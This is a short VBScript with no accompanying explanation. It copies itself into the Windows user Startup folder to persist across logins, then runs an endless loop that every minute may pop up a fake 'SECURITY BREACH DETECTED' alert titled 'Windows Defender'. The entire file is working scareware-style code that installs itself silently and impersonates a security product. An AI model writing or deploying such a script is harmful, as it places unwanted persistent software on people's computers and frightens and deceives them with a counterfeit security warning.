Option Explicit
Dim objFSO, objShell, strUsername, strSourcePath, strDestPath
Dim objRandom, intRandom
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
strUsername = objShell.ExpandEnvironmentStrings("%USERNAME%")
strSourcePath = WScript.ScriptFullName
strDestPath = objShell.ExpandEnvironmentStrings("C:\Users\" & strUsername & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\")
If objFSO.FileExists(strDestPath & WScript.ScriptName) Then
Else
objFSO.CopyFile strSourcePath, strDestPath
End If
Do
Dim randomNum
randomNum = Int((100 * Rnd) + 1)
If randomNum <= 10 Then
MsgBox "SECURITY BREACH DETECTED", vbExclamation,"Windows Defender"
End If
WScript.Sleep 60000
Loop
